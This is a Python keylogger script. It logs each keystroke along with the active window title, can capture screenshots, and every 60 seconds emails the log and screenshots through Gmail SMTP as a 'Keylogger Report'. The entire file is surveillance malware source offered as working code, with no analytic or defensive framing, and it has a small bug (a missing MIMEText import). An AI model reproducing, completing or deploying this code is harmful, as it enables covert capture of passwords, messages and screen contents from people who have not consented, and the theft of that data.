import os
import smtplib
import time
import pygetwindow as gw
from datetime import datetime
from PIL import ImageGrab
from pynput import keyboard
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from getpass import getpass

LOG_FILE = "keylog.txt"
SCREENSHOT_DIR = "screenshots"
INTERVAL = 60  # in seconds

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

def send_email(subject, body, to, email, password, attachments=[]):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = to
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    for attachment in attachments:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(attachment, 'rb').read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
        msg.attach(part)
    
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email, password)
        server.sendmail(email, to, msg.as_string())

def capture_screenshot():
    now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    screenshot_path = os.path.join(SCREENSHOT_DIR, f'screenshot_{now}.png')
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    return screenshot_path

def on_press(key):
    try:
        active_window = gw.getActiveWindow()
        active_window_title = active_window.title if active_window else "Unknown"
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a") as f:
            f.write(f'{timestamp} - {active_window_title} - {key.char}\n')
    except AttributeError:
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.esc: "[ESC]",
        }
        with open(LOG_FILE, "a") as f:
            f.write(f'{timestamp} - {active_window_title} - {special_keys.get(key, f"[{key}]")}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def send_log_email(email, password):
    try:
        attachments = [LOG_FILE] + [os.path.join(SCREENSHOT_DIR, f) for f in os.listdir(SCREENSHOT_DIR)]
        send_email("Keylogger Report", "Attached are the keylogs and screenshots.", email, email, password, attachments)
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        Timer(INTERVAL, send_log_email, args=[email, password]).start()

def get_email_credentials():
    email = input("Enter your email address: ")
    password = getpass("Enter your email password: ")
    return email, password

def start_keylogger():
    email, password = get_email_credentials()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        Timer(INTERVAL, send_log_email, args=[email, password]).start()
        listener.join()

if __name__ == "__main__":
    start_keylogger()


